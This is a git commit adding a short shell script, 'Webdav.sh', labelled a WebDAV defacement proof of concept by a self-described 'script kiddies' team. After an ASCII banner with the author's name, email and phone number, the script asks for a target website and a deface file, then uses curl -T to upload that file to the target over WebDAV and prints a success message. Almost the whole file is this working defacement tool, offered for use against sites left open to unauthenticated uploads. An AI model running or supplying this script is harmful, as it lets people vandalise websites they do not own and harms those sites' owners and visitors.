9f82ea2c7aced2dcca3d8a61c22d5d0e7fc3182b
jayakusuma07 <56112538+jayakusuma07@users.noreply.github.com>
2019-10-03 16:39:43 +0700

    Webdav
    TOOLS DEFACE POC WEBDAV

---
+++ Webdav.sh
@@ -0,0 +1,13 @@
+clear
+cowsay -f eyes 'WEBDAV
+
+# CREATE  : JAYA KUSUMA
+# TEAM    : SCRIPT KIDDIES SQUAD
+# CONTACT : Kusumajayax100@gmail.com
+# WHATSAPP: 085859400250' | lolcat
+
+
+read -p " Website Target ==> " target
+read -p " Nama sript Defacenya ==> " sc;
+curl -T /storage/emulated/0/$sc $target
+echo " [!] Suksess... "
